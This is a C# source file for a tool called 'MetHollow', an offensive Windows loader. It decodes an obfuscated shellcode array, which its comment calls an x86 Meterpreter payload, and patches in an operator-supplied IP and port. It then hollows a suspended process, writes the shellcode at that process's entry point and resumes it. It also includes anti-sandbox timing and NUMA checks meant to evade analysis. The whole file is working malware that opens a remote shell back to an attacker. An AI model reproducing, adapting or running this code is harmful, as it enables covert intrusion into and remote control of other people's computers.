using System;
using System.Runtime.InteropServices;
using System.Net;

namespace MetHollow
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll")]
        static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] MetHollow (x86) started");

            if (args.Length < 3)
            {
                Console.WriteLine("[-] Usage: MetHollow.exe <IP> <Port> <ProcessPath>");
                return;
            }

            if (!IPAddress.TryParse(args[0], out IPAddress ip) || !int.TryParse(args[1], out int port) || port < 1 || port > 65535)
            { Console.WriteLine("[-] Invalid arguments"); return; }
            string targetExe = args[2];
            Console.WriteLine("[*] Target: {0}:{1} -> hollow '{2}'", ip, port, targetExe);

            // 反沙箱
            Console.WriteLine("[*] Sleeping 5 seconds...");
            var t1 = DateTime.Now; Sleep(5000);
            if ((DateTime.Now - t1).TotalSeconds < 4.5) return;
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero) return;
            Console.WriteLine("[+] NUMA alloc succeeded");

            // ========== 正确的 x86 Meterpreter 载荷（凯撒+5）==========
            byte[] enc = {
                0x01,0xed,0x94,0x05,0x05,0x05,0x65,0x36,0xd7,0x8e,0xea,0x69,
                0x90,0x57,0x35,0x90,0x57,0x11,0x90,0x57,0x19,0x90,0x77,0x2d,
                0x36,0x04,0x14,0xbc,0x4f,0x2b,0x36,0xc5,0xb1,0x41,0x66,0x81,
                0x07,0x31,0x25,0xc6,0xd4,0x12,0x06,0xcc,0x4e,0x7a,0xf4,0x57,
                0x90,0x57,0x15,0x5c,0x90,0x47,0x41,0x06,0xd5,0x90,0x45,0x7d,
                0x8a,0xc5,0x79,0x51,0x06,0xd5,0x90,0x4d,0x1d,0x90,0x5d,0x25,
                0x55,0x06,0xd8,0x8a,0xce,0x79,0x41,0x36,0x04,0x4e,0x90,0x39,
                0x90,0x06,0xdb,0x36,0xc5,0xb1,0xc6,0xd4,0x12,0x06,0xcc,0x3d,
                0xe5,0x7a,0xf9,0x08,0x82,0xfd,0x40,0x82,0x29,0x7a,0xe5,0x5d,
                0x90,0x5d,0x29,0x06,0xd8,0x6b,0x90,0x11,0x50,0x90,0x5d,0x21,
                0x06,0xd8,0x90,0x09,0x90,0x06,0xd5,0x8e,0x49,0x29,0x29,0x60,
                0x60,0x66,0x5e,0x5f,0x56,0x04,0xe5,0x5d,0x64,0x5f,0x90,0x17,
                0xee,0x85,0x04,0x04,0x04,0x62,0x6d,0x38,0x37,0x05,0x05,0x6d,
                0x7c,0x78,0x37,0x64,0x59,0x6d,0x51,0x7c,0x2b,0x0c,0x8e,0xed,
                0x04,0xd5,0xbd,0x95,0x06,0x05,0x05,0x2e,0xc9,0x59,0x55,0x6d,
                0x2e,0x85,0x70,0x05,0x04,0xda,0x6f,0x0f,0x6d,0x16,0x16,0x16,
                0x16,0x6d,0x07,0x05,0x27,0x27,0x8e,0xeb,0x55,0x55,0x55,0x55,
                0x45,0x55,0x45,0x55,0x6d,0xef,0x14,0xe4,0xe5,0x04,0xda,0x9c,
                0x6f,0x15,0x5b,0x5c,0x6d,0x9e,0xaa,0x79,0x66,0x04,0xda,0x8a,
                0xc5,0x79,0x0f,0x04,0x53,0x0d,0x7a,0xf1,0xed,0x6c,0x05,0x05,
                0x05,0x6f,0x05,0x6f,0x09,0x5b,0x5c,0x6d,0x07,0xde,0xcd,0x64,
                0x04,0xda,0x88,0xfd,0x05,0x83,0x3b,0x90,0x3b,0x6f,0x45,0x6d,
                0x05,0x15,0x05,0x05,0x5b,0x6f,0x05,0x6d,0x5d,0xa9,0x58,0xea,
                0x04,0xda,0x98,0x58,0x6f,0x05,0x5b,0x58,0x5c,0x6d,0x07,0xde,
                0xcd,0x64,0x04,0xda,0x88,0xfd,0x05,0x82,0x2d,0x5d,0x6d,0x05,
                0x45,0x05,0x05,0x6f,0x05,0x55,0x6d,0x10,0x34,0x14,0x35,0x04,
                0xda,0x5c,0x6d,0x7a,0x73,0x52,0x66,0x04,0xda,0x63,0x63,0x04,
                0x11,0x29,0x14,0x8a,0x75,0x04,0x04,0x04,0xee,0xa0,0x04,0x04,
                0x04,0x06,0xc8,0x2e,0xcb,0x7a,0xc6,0xc8,0xc0,0xf5,0xba,0xa7,
                0x5b,0x6f,0x05,0x58,0x04,0xda
            };

            byte[] buf = new byte[enc.Length];
            for (int i = 0; i < buf.Length; i++)
                buf[i] = (byte)(((uint)enc[i] - 5) & 0xFF);

            // 定位 sockaddr 特征：AF_INET + 占位端口
            byte[] pattern = { 0x02, 0x00, 0x22, 0x22 };
            int pos = FindBytes(buf, pattern);
            if (pos == -1) { Console.WriteLine("[-] Pattern not found"); return; }
            int portOffset = pos + 2;
            int ipOffset = pos - 5;  // x86 特殊偏移
            buf[portOffset] = (byte)((port >> 8) & 0xFF);
            buf[portOffset + 1] = (byte)(port & 0xFF);
            Buffer.BlockCopy(ip.GetAddressBytes(), 0, buf, ipOffset, 4);
            Console.WriteLine("[*] Payload configured for {0}:{1}", ip, port);

            // 创建挂起进程
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            if (!CreateProcess(null, targetExe, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("[-] CreateProcess failed: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Created {0} (PID {1}) suspended", targetExe, pi.dwProcessId);

            // 获取入口点
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            int imageBaseOffset = IntPtr.Size == 8 ? 0x10 : 0x8;
            IntPtr ptrToImageBase = (IntPtr)((int)bi.PebAddress + imageBaseOffset);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            long imageBase = IntPtr.Size == 8 ? BitConverter.ToInt64(addrBuf, 0) : BitConverter.ToUInt32(addrBuf, 0);

            byte[] peHeader = new byte[0x200];
            ReadProcessMemory(pi.hProcess, (IntPtr)imageBase, peHeader, peHeader.Length, out nRead);
            uint e_lfanew = BitConverter.ToUInt32(peHeader, 0x3C);
            uint entryRva = BitConverter.ToUInt32(peHeader, (int)e_lfanew + 0x28);
            IntPtr entryPoint = (IntPtr)(imageBase + entryRva);
            Console.WriteLine("[*] EntryPoint at 0x{0:X}", entryPoint.ToInt64());

            // 写入 shellcode
            IntPtr written;
            if (!WriteProcessMemory(pi.hProcess, entryPoint, buf, buf.Length, out written))
            {
                Console.WriteLine("[-] WriteProcessMemory failed: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Shellcode written ({0} bytes)", (int)written);

            // 恢复线程
            ResumeThread(pi.hThread);
            Console.WriteLine("[+] Thread resumed. Hollow success.");
        }

        static int FindBytes(byte[] src, byte[] pat)
        {
            for (int i = 0; i <= src.Length - pat.Length; i++)
            {
                bool ok = true;
                for (int j = 0; j < pat.Length; j++)
                    if (src[i + j] != pat[j]) { ok = false; break; }
                if (ok) return i;
            }
            return -1;
        }
    }
}